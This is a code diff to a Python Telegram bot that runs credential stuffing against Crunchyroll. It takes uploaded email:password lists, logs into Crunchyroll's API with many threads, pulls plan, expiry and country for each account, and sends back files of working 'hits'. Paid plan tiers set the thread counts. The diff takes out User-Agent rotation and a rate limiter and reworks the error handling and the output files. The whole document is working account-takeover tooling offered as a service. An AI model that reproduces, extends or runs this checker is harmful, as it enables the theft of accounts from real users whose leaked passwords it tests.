@@ -5,8 +5,6 @@ import os
 import time
 import uuid
 import requests
-import random
-import threading
 import concurrent.futures
 from datetime import datetime, date
 import asyncio
@@ -52,27 +50,6 @@ PLAN_CONFIG = {
         "queue_waiting": False
     }
 }
-
-class RateLimiter:
-    """Best proxyless rate limiter - controls total requests per second"""
-    def __init__(self, max_rps: int = 35):
-        self.max_rps = max_rps
-        self.lock = threading.Lock()
-        self.tokens = 0
-        self.last_refill = time.time()
-
-    def acquire(self):
-        """Wait until we can send the next request"""
-        while True:
-            with self.lock:
-                now = time.time()
-                if now - self.last_refill >= 1.0:
-                    self.tokens = self.max_rps
-                    self.last_refill = now
-                if self.tokens > 0:
-                    self.tokens -= 1
-                    return
-            time.sleep(0.008)
 
 # ============= PLAN DEFAULTS FOR /setplan COMMAND =============
 PLAN_DEFAULTS = {
@@ -617,7 +594,7 @@ Try another account!
         """.strip()
 
 def check_crunchyroll(email, password, proxy=None):
-    """Improved proxyless version with better rate limit handling + UA rotation"""
+    """Improved version with better error messages"""
     result = {
         'email': email,
         'password': password,
@@ -638,6 +615,7 @@ def check_crunchyroll(email, password, proxy=None):
     
     for attempt in range(max_retries + 1):
         try:
+            # Step 1: Get Access Token
             device_id = str(uuid.uuid4())
             token_url = "https://beta-api.crunchyroll.com/auth/v1/token"
             token_data = {
@@ -651,26 +629,18 @@ def check_crunchyroll(email, password, proxy=None):
                 "device_id": device_id,
                 "device_name": "CrunchyBot"
             }
-
-            # Rotate User-Agent for better proxyless stability
-            user_agents = [
-                'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                'Dalvik/2.1.0 (Linux; U; Android 13; SM-S918B Build/TP1A.220624.014)'
-            ]
             headers = {
                 'Content-Type': 'application/x-www-form-urlencoded',
-                'User-Agent': random.choice(user_agents)
+                'User-Agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
             }
-
+            
             proxies = {'http': proxy, 'https': proxy} if proxy else None
-
             resp = requests.post(token_url, data=token_data, headers=headers, proxies=proxies, timeout=25)
             
             if resp.status_code != 200:
                 error_text = resp.text.lower()
 
-                if "two_factor" in error_text or "2fa" in error_text or "otp_required" in error_text:
+                if "two_factor" in error_text or "2fa" in error_text or "otp_required" in error_text or "verification_code" in error_text:
                     result['message'] = "2FA / OTP Required"
                 elif "invalid_credentials" in error_text or "invalid username or password" in error_text:
                     result['message'] = "Invalid email or password"
@@ -678,32 +648,34 @@ def check_crunchyroll(email, password, proxy=None):
                     result['message'] = "Account is locked"
                 elif resp.status_code == 429:
                     result['message'] = "Too many attempts (rate limited)"
-                    if attempt < max_retries:
-                        time.sleep(2.5 + random.uniform(0, 2))
-                        continue
+                elif resp.status_code == 403:
+                    result['message'] = "Access forbidden"
                 else:
                     result['message'] = f"Login failed (HTTP {resp.status_code})"
 
                 if attempt < max_retries:
                     time.sleep(1.5)
                     continue
+                result['message'] = f"HTTP {resp.status_code}"
                 return result
                 
             token_data = resp.json()
             access_token = token_data.get('access_token')
             
             if not access_token:
-                result['message'] = "Failed to get access token"
-                return result
-
-            # Use the same random User-Agent for subsequent requests
-            acc_headers = {
-                'Authorization': f'Bearer {access_token}',
-                'User-Agent': headers['User-Agent']
-            }
+                if 'invalid_credentials' in resp.text.lower():
+                    result['message'] = "Invalid email or password"
+                    return result
+                elif attempt < max_retries:
+                    time.sleep(1.5)
+                    continue
+                else:
+                    result['message'] = "Failed to get access token"
+                    return result
             
-            acc_resp = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me", 
-                                  headers=acc_headers, proxies=proxies, timeout=25)
+            # Step 2: Get Account Info
+            acc_headers = {'Authorization': f'Bearer {access_token}', 'User-Agent': headers['User-Agent']}
+            acc_resp = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=acc_headers, proxies=proxies, timeout=25)
             
             if acc_resp.status_code == 200:
                 acc_data = acc_resp.json()
@@ -714,7 +686,7 @@ def check_crunchyroll(email, password, proxy=None):
                 external_id = acc_data.get('external_id')
                 
                 if external_id:
-                    # Subscription
+                    # Step 3: Subscription
                     subs_resp = requests.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}", 
                                            headers=acc_headers, proxies=proxies, timeout=25)
                     if subs_resp.status_code == 200:
@@ -723,7 +695,7 @@ def check_crunchyroll(email, password, proxy=None):
                         result['expiry'] = subs_data.get('next_renewal_date', '').split('T')[0] if subs_data.get('next_renewal_date') else ''
                         result['country'] = subs_data.get('country_code', 'Unknown')
                     
-                    # Products
+                    # Step 4: Products
                     prod_resp = requests.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products", 
                                            headers=acc_headers, proxies=proxies, timeout=25)
                     if prod_resp.status_code == 200:
@@ -734,7 +706,7 @@ def check_crunchyroll(email, password, proxy=None):
                             result['currency'] = items[0].get('currency_code', '')
                             result['subscribable'] = 'Yes' if product.get('is_subscribable') else 'No'
                             result['free_trial'] = 'Yes' if items[0].get('active_free_trial') else 'No'
-
+            
             # Final decision
             if result['active'] == 'Yes' and result['subscribable'] == 'Yes':
                 result['success'] = True
@@ -743,7 +715,7 @@ def check_crunchyroll(email, password, proxy=None):
                 result['success'] = False
                 result['message'] = 'Valid account but no paid plan'
             
-            return result
+            return result   # Success on this attempt
             
         except Exception as e:
             if attempt < max_retries:
@@ -934,6 +906,8 @@ async def handle_document(update: Update, context: CallbackContext):
         return
     
     document = update.message.document
+
+    # Check if user is on the main dashboard
     is_on_main_menu = context.user_data.get('in_main_menu', False)
     
     if not is_on_main_menu:
@@ -968,21 +942,12 @@ async def handle_document(update: Update, context: CallbackContext):
     hits = []
     start_time = time.time()
 
+    # === Get fresh limits from database (no global needed) ===
     stats = get_user_stats()
     reset_daily_if_needed(stats)
     stats = get_user_stats()
     limits = get_plan_limits(stats)
     user_threads = limits["current_threads"]
-
-    # ================= BEST PROXYLESS RATE LIMITER =================
-    # These values work very well in practice:
-    if limits["display_name"] == "FREE":
-        max_rps = 22
-    elif "BASIC" in limits["display_name"]:
-        max_rps = 33
-    else:  # VIP
-        max_rps = 48
-    rate_limiter = RateLimiter(max_rps=max_rps)
 
     progress_msg = await update.message.reply_text(
         f"🚀 Starting bulk check with <b>{user_threads}</b> threads...\n"
@@ -990,6 +955,7 @@ async def handle_document(update: Update, context: CallbackContext):
         parse_mode='HTML'
     )
 
+    # Daily limit check (already good)
     if limits["daily_limit"] is not None:
         if stats["today_scans"] + total > limits["daily_limit"]:
             await update.message.reply_text(
@@ -1002,10 +968,7 @@ async def handle_document(update: Update, context: CallbackContext):
     
     def check_account(acc):
         email, pwd = acc
-        rate_limiter.acquire()
-        result = check_crunchyroll(email, pwd)
-        time.sleep(0.25 + random.uniform(0.15, 0.45))
-        return result
+        return check_crunchyroll(email, pwd)
     
     completed = 0
     
@@ -1030,15 +993,17 @@ async def handle_document(update: Update, context: CallbackContext):
                 except:
                     pass
     
-    # ====================== UPDATE STATS ======================
+    # ====================== UPDATE SUPABASE STATS ======================
     hits_count = len(hits)
     bad_count = total - hits_count
+    
+    # Get current stats and update
     current_stats = get_user_stats()
     
     update_user_stats({
         "total_scans": current_stats["total_scans"] + total,
         "total_hits": current_stats["total_hits"] + hits_count,
-        "total_free": current_stats.get("total_free", 0) + bad_count,
+        "total_free": current_stats.get("total_free", 0) + bad_count,   # ← Now tracks BAD
         "today_scans": current_stats["today_scans"] + total
     })
 
@@ -1062,26 +1027,19 @@ async def handle_document(update: Update, context: CallbackContext):
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 """
     await progress_msg.edit_text(summary, parse_mode='HTML')
-    await manage_result_pin(update, context, progress_msg.message_id)
 
-    # ====================== FULL CAPTION HITS FILE ======================
+    # 🔥 AUTO PIN THE BULK RESULT SUMMARY
+    await manage_result_pin(update, context, progress_msg.message_id)
+    
+    # ====================== SEND RESULTS FILES ======================
     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
     
+    # 1. Send HITS file (only if hits found)
     if hits_count > 0:
-        hits_text = "🎉 CRUNCHYROLL HITS - FULL DETAIL\n" + "="*70 + "\n\n"
+        hits_text = "EMAIL:PASSWORD | PLAN | EXPIRY | COUNTRY\n" + "="*60 + "\n"
         for hit in hits:
-            country_code = hit.get('country', 'ZZ').upper()
-            flag = REGION_HINTS.get(country_code, "🌍")
-            expiry_display = get_days_remaining(hit['expiry']) if hit.get('expiry') else 'N/A'
-            
-            hits_text += f"✅ HIT FOUND!\n"
-            hits_text += f"📧 Email      : {hit['email']}\n"
-            hits_text += f"🔑 Password   : {hit['password']}\n"
-            hits_text += f"📊 Plan       : {hit['plan']}\n"
-            hits_text += f"📆 Expires    : {expiry_display}\n"
-            hits_text += f"🌍 Country    : {country_code} {flag}\n"
-            hits_text += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-
+            hits_text += f"{hit['email']}:{hit['password']} | {hit['plan']} | {hit['expiry']} | {hit['country']}\n"
+        
         hits_file = f"/tmp/crunchy_hits_{timestamp}.txt"
         with open(hits_file, "w", encoding="utf-8") as f:
             f.write(hits_text)
@@ -1089,14 +1047,17 @@ async def handle_document(update: Update, context: CallbackContext):
         await update.message.reply_document(
             document=open(hits_file, "rb"),
             filename=f"crunchy_hits_{datetime.now().strftime('%Y%m%d_%H%M')}.txt",
-            caption=f"🎉 <b>{hits_count} HIT(S) FOUND!</b>\nFull detailed captions included.",
+            caption=f"🎉 <b>{hits_count} HIT(S) FOUND!</b>\n\nChecked with {user_threads} threads.",
             parse_mode='HTML'
         )
 
-    # Bad file (kept simple)
+    # 2. Send BAD file (always sent when there are bad accounts)
     if bad_count > 0:
         bad_text = "EMAIL:PASSWORD | STATUS\n" + "="*40 + "\n"
+        
+        # Fast lookup for hits
         hit_emails = {hit['email'] for hit in hits}
+        
         for email, pwd in accounts:
             status = "HIT" if email in hit_emails else "BAD"
             bad_text += f"{email}:{pwd} | {status}\n"
@@ -1108,7 +1069,7 @@ async def handle_document(update: Update, context: CallbackContext):
         await update.message.reply_document(
             document=open(bad_file, "rb"),
             filename=f"crunchy_bad_{datetime.now().strftime('%Y%m%d_%H%M')}.txt",
-            caption=f"❌ <b>{bad_count} BAD accounts</b>\nTotal checked: {total}",
+            caption=f"❌ <b>{bad_count} BAD accounts</b>\n\nTotal checked: {total} | Threads: {user_threads}",
             parse_mode='HTML'
         )
 
